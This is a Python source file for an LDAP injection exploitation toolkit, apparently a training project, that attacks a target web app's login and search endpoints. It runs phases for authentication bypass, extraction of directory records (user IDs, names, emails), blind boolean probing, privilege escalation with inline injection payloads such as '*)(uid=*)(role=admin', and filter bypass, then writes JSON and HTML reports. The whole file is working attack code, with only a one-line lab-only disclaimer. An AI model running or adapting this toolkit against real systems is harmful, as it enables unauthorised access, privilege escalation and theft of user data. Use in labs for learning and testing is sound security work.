#!/usr/bin/env python3
"""
ldap_toolkit.py — LDAP Injection Exploitation Toolkit (Project #45)
LEGAL: only test your own lab or PortSwigger labs.
"""

import argparse
import json
import os
import time
from datetime import datetime
from urllib.parse import quote

import requests

import ldap_payloads as P

REPORTS_DIR = "reports"
EXTRACTED_DIR = "extracted"
DEFAULT_TIMEOUT = 10

class Colors:
    GREEN   = "\033[92m"
    RED     = "\033[91m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    RESET   = "\033[0m"
    BOLD    = "\033[1m"

class LDAPToolkit:
    def __init__(self, base_url, timeout=DEFAULT_TIMEOUT):
        self.base = base_url.rstrip("/")
        self.timeout = timeout

        os.makedirs(REPORTS_DIR, exist_ok=True)
        os.makedirs(EXTRACTED_DIR, exist_ok=True)

        self.report = {
            "target": self.base,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "phases": {},
        }

    # ------------------------------------------------------------------
    def _login(self, username, password):
        """POST to /login. Returns (status_code, body_text, parsed_json|None)."""
        try:
            r = requests.post(
                f"{self.base}/login",
                data={"username": username, "password": password},
                timeout=self.timeout,
                allow_redirects=True,
            )
            try:
                js = r.json()
            except Exception:
                js = None
            return r.status_code, r.text, js
        except Exception as e:
            return None, f"[ERROR] {type(e).__name__}: {e}", None

    def _has(self, text, indicators):
        if not text:
            return False, None
        for ind in indicators:
            if ind in text:
                return True, ind
        return False, None

    # ------------------------------------------------------------------
    # PHASE 1 — Detection
    # ------------------------------------------------------------------
    def phase1_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 1] LDAP DETECTION{Colors.RESET}")
        results = {}

        for name, (user, pw) in P.DETECTION_PAYLOADS.items():
            print(f"\n  [{name.upper()}] user={user!r} pw={pw!r}")
            status, body, js = self._login(user, pw)
            hit, ind = self._has(body, P.INDICATORS["auth_success"])
            if hit:
                print(f"    {Colors.GREEN}[+] LOGIN SUCCESS!{Colors.RESET} ({ind})")
                print(f"    Message: {(js or {}).get('message', body[:120])}")
            else:
                print(f"    {Colors.YELLOW}[-] no login{Colors.RESET}")
            results[name] = {
                "confirmed": hit, "status": status,
                "snippet": (body or "")[:300],
            }

        self.report["phases"]["detection"] = results

    # ------------------------------------------------------------------
    # PHASE 2 — Auth bypass
    # ------------------------------------------------------------------
    def phase2_auth_bypass(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 2] AUTH BYPASS{Colors.RESET}")
        results = {}

        for name, (user, pw) in P.AUTH_BYPASS.items():
            print(f"\n  [{name.upper()}] user={user!r} pw={pw!r}")
            status, body, js = self._login(user, pw)
            hit, ind = self._has(body, P.INDICATORS["auth_success"])
            if hit:
                role = "?"
                if js and isinstance(js.get("user"), dict):
                    role = js["user"].get("role", "?")
                print(f"    {Colors.RED}[+] BYPASS!{Colors.RESET} logged in (role={role})")
                print(f"    Message: {(js or {}).get('message', body[:120])}")
            else:
                print(f"    {Colors.YELLOW}[-] rejected{Colors.RESET}")
            results[name] = {
                "bypassed": hit, "status": status,
                "role": (js or {}).get("user", {}).get("role") if js else None,
                "snippet": (body or "")[:300],
            }

        self.report["phases"]["auth_bypass"] = results

    # ------------------------------------------------------------------
    # PHASE 3 — Data extraction
    # ------------------------------------------------------------------
    def phase3_data_extraction(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 3] DATA EXTRACTION{Colors.RESET}")
        results = {}

        for name, (user, pw) in P.DATA_EXTRACTION.items():
            print(f"\n  [{name.upper()}] user={user!r}")
            status, body, js = self._login(user, pw)
            # Also hit /search with the same wildcard
            try:
                sr = requests.get(
                    f"{self.base}/search",
                    params={"q": user},
                    timeout=self.timeout,
                )
                sr_json = sr.json() if sr.headers.get("content-type", "").startswith("application/json") else {}
            except Exception:
                sr_json = {}

            found_users = sr_json.get("results", []) if isinstance(sr_json, dict) else []
            hit = bool(found_users) or (js and js.get("status") == "ok")

            if hit:
                if found_users:
                    for u in found_users:
                        print(f"      {Colors.GREEN}{u.get('uid')}{Colors.RESET} | {u.get('cn')} | {u.get('mail')}")
                else:
                    print(f"      {Colors.GREEN}login success via injection{Colors.RESET}")
            else:
                print(f"      {Colors.YELLOW}[-] no data{Colors.RESET}")

            results[name] = {
                "found": hit,
                "count": len(found_users),
                "results": found_users,
                "login_snippet": (body or "")[:300],
            }

        self.report["phases"]["data_extraction"] = results

    # ------------------------------------------------------------------
    # PHASE 4 — Blind LDAP (boolean-based)
    # ------------------------------------------------------------------
    def phase4_blind_ldap(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 4] BLIND LDAP{Colors.RESET}")
        results = {}

        for name, (user, pw) in P.BLIND_LDAP.items():
            print(f"\n  [{name.upper()}] user={user!r}")
            status, body, js = self._login(user, pw)
            hit, ind = self._has(body, P.INDICATORS["auth_success"])
            print(f"    {'[+]' if hit else '[-]'} {'TRUE' if hit else 'FALSE'}")
            results[name] = {"bool": hit, "snippet": (body or "")[:200]}

        self.report["phases"]["blind_ldap"] = results

    # ------------------------------------------------------------------
    # PHASE 5 — Privilege escalation
    # ------------------------------------------------------------------
    def phase5_priv_esc(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 5] PRIVILEGE ESCALATION{Colors.RESET}")
        results = {}

        tests = {
            "force_admin_role": ("*)(uid=*)(role=admin", "*"),
            "admin_via_or":     ("*)(|(uid=admin))(|(uid=*", "*"),
            "role_inject":      ("admin)(|(role=admin", "x"),
        }

        for name, (user, pw) in tests.items():
            print(f"\n  [{name.upper()}] user={user!r} pw={pw!r}")
            status, body, js = self._login(user, pw)
            hit, ind = self._has(body, P.INDICATORS["admin_leak"])
            role = None
            if js and isinstance(js.get("user"), dict):
                role = js["user"].get("role")
            if hit or (role == "admin"):
                print(f"    {Colors.RED}[+] PRIV-ESC!{Colors.RESET} role={role}")
            else:
                print(f"    {Colors.YELLOW}[-] no admin role{Colors.RESET}")
            results[name] = {
                "escalated": bool(hit) or role == "admin",
                "role": role,
                "snippet": (body or "")[:300],
            }

        self.report["phases"]["priv_escalation"] = results

    # ------------------------------------------------------------------
    # PHASE 6 — Filter bypass
    # ------------------------------------------------------------------
    def phase6_filter_bypass(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 6] FILTER BYPASS{Colors.RESET}")
        results = {}

        for name, (user, pw) in P.bypass_payloads().items():
            print(f"\n  [{name.upper()}] user={user!r}")
            status, body, js = self._login(user, pw)
            hit, ind = self._has(body, P.INDICATORS["auth_success"])
            print(f"    {'[+] BYPASSED' if hit else '[-] blocked'}")
            results[name] = {
                "payload": user, "bypassed": hit,
                "snippet": (body or "")[:200],
            }

        self.report["phases"]["filter_bypass"] = results

    # ------------------------------------------------------------------
    # PHASE 7 — Report
    # ------------------------------------------------------------------
    def _collect_confirmed(self):
        confirmed = []
        for phase, data in self.report["phases"].items():
            if isinstance(data, dict):
                for k, v in data.items():
                    if not isinstance(v, dict):
                        continue
                    if (v.get("confirmed") or v.get("bypassed")
                            or v.get("found") or v.get("escalated")
                            or v.get("bool")):
                        confirmed.append(f"{phase}.{k}")
        return confirmed

    def phase7_report(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 7] EXPLOITATION SUMMARY{Colors.RESET}")
        confirmed = self._collect_confirmed()
        print(f"\n    Total confirmed findings: {len(confirmed)}")
        for c in confirmed:
            print(f"      * {c}")

        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        json_path = f"{REPORTS_DIR}/ldap_report_{ts}.json"
        with open(json_path, "w") as f:
            json.dump(self.report, f, indent=2, default=str)
        print(f"\n    {Colors.GREEN}[OK] JSON: {json_path}{Colors.RESET}")

        html_path = f"{REPORTS_DIR}/ldap_report_{ts}.html"
        with open(html_path, "w") as f:
            f.write(self._build_html(confirmed))
        print(f"    {Colors.GREEN}[OK] HTML: {html_path}{Colors.RESET}")

    def _build_html(self, confirmed):
        rows = ""
        for phase, data in self.report["phases"].items():
            rows += f"<h3>{phase}</h3><pre>{json.dumps(data, indent=2, default=str)[:2500]}</pre>"
        return f"""<!DOCTYPE html><html><head><title>LDAP Report</title>
<style>
body {{ font-family: monospace; background:#111; color:#eee; padding:20px; }}
h1 {{ color:#ff5555; }} h3 {{ color:#55ff55; border-bottom:1px solid #333; }}
pre {{ background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }}
</style></head><body>
<h1>LDAP Injection Report</h1>
<p><b>Target:</b> {self.base}</p>
<p><b>Timestamp:</b> {self.report['timestamp']}</p>
<p>Confirmed: {len(confirmed)}</p>
<ul>{''.join(f'<li>{c}</li>' for c in confirmed)}</ul>
{rows}
</body></html>"""

    # ------------------------------------------------------------------
    def run_all(self):
        print("=" * 64)
        print("  LDAP Injection Exploitation Toolkit - Project #45")
        print("=" * 64)
        print(f"[+] Target: {self.base}")
        self.phase1_detection()
        self.phase2_auth_bypass()
        self.phase3_data_extraction()
        self.phase4_blind_ldap()
        self.phase5_priv_esc()
        self.phase6_filter_bypass()
        self.phase7_report()

def main():
    ap = argparse.ArgumentParser(description="LDAP Injection Exploitation Toolkit")
    ap.add_argument("-t", "--target", required=True,
                    help="Base URL (e.g. http://127.0.0.1:5000)")
    ap.add_argument("--timeout", type=int, default=10)
    args = ap.parse_args()

    toolkit = LDAPToolkit(args.target, args.timeout)
    toolkit.run_all()

if __name__ == "__main__":
    main()
